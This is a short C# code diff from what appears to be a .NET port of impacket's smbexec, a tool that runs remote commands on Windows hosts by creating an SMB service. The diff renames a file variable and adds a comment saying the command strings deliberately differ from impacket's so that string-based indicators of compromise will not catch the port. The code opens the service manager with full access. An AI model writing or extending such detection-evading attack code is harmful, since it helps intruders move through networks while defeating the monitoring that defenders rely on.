@@ -2664,8 +2664,8 @@ switch (args[0])
         var rng = new Random();
         string serviceName = SmbExecCommand.ServiceName(rng);
         string outputFilename = SmbExecCommand.OutputFilename(rng);
-        string batchFile = SmbExecCommand.BatchFile(rng);
-        string binaryPath = SmbExecCommand.BuildCmd(command, share, outputFilename, batchFile);
+        string scriptFile = SmbExecCommand.ScriptFile(rng);
+        string binaryPath = SmbExecCommand.BuildCmd(command, share, outputFilename, scriptFile);
 
         using var client = new Smb2Client();
         client.Connect(host, port);
@@ -2684,7 +2684,10 @@ switch (args[0])
         Console.WriteLine($"smbexec on {host} (SHARE mode, share={share}):");
         Console.WriteLine($"  service name:   {serviceName}");
         Console.WriteLine($"  output file:    {share}\\{outputFilename}");
-        Console.WriteLine($"  service binPath (the detection signature):");
+        // Behaviour matches smbexec; the string tokens deliberately differ from impacket's
+        // (cmd.exe vs %COMSPEC% /Q /c, %TEMP%\...cmd vs %SYSTEMROOT%\...bat, no __output_ prefix)
+        // so a brittle string IOC won't catch this port — see docs/WIRE_DIFF.md.
+        Console.WriteLine($"  service binPath (behaviour of smbexec, DotNetPacket fingerprint):");
         Console.WriteLine($"    {binaryPath}");
 
         ScHandleResult scm = Svcctl.OpenScManager(pipe, null, ScManagerAccess.AllAccess);
